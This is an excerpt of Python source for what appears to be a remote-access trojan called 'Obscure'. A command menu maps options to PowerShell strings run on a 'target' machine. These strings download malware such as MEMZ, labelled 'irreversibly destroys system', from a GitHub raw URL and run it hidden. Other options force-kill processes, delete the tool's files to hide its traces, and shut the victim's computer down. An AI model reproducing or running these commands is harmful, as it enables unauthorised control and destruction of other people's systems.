...
GLOBAL_OPTIONS = { # Create the structure for all user options and commands
    ...
    "Configure malware": {
        "Salinewin.exe": {
            "Install (non-destructive, purely effects)": "cd c:/win64; Start-Sleep -Seconds 3; Remove-Item 'C:\\win64\\saline.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/ware/main/salinewin1.5-safety.exe' -OutFile 'C:\\win64\\saline.exe'; Start-Process 'C:\\win64\\saline.exe' -WindowStyle hidden",
            "Stop": "Get-Process 'saline' | Stop-Process -Force"
        },
        "Memz.exe": {
            "Install \u001b[31m(irreversibly destroys system)\u001b[90m": "cd c:/win64; Start-Sleep -Seconds 3; Remove-Item 'C:\\win64\\mz.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/ware/main/memz.exe' -OutFile 'C:\\win64\\mz.exe'; Start-Process 'C:\\win64\\mz.exe' -WindowStyle hidden",
            "Stop": "Get-Process 'memz' | Stop-Process -Force"
        },
        "ButterflyOnDesktop.exe": {
            "Install (non-destructive, but closed source)": "cd c:/win64; if(Test-Path 'C:\\win64\\bfly.exe'){for($i=0;$i -lt 5;$i++){Start-Process 'C:\\win64\\bfly.exe'}}else{Start-Sleep -Seconds 3; Remove-Item 'C:\\win64\\bfly.exe' -Force; iwr 'raw.githubusercontent.com/antiweevil/ware/main/bod.exe' -OutFile 'C:\\win64\\bfly.exe'; Start-Process 'C:\\win64\\bfly.exe' -WindowStyle hidden}",
    ...
    "Shut down machine": {
        "Confirm \u001b[31m(will break connection, remove Obscure from target files)\u001b[90m": (
            "Get-Process powershell | Where-Object { $_.Id -ne $PID } | Stop-Process -Force; Get-ChildItem -Path C:\\win64\\ -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse; Stop-Computer -Force",
            "",
            "<ENDOF_CONNECTION>"
        )
    },
    ...
    "Break connection": {
        "Confirm \u001b[31m(will break connection, remove Obscure from target files)\u001b[90m": (
            "Get-Process powershell | Where-Object { $_.Id -ne $PID } | Stop-Process -Force; Get-ChildItem -Path C:\\win64\\ -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse; Get-Process powershell | Stop-Process -Force",
            "",
            "<ENDOF_CONNECTION>"
        )
    }
